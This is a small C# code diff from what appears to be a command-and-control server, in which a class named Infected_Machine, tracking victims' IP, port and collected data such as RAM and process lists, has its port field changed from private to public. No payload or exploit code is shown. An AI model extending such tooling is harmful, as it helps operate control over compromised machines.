@@ -9,7 +9,7 @@ namespace Server.CnC_Server
         private readonly static List<string> validDataNames = new List<string> { "ram", "processes" };
 
         public readonly string ip;
-        private readonly int port;
+        public readonly int port;
         private Dictionary<string, double> data;
 
         public Infected_Machine(string ip, int port)
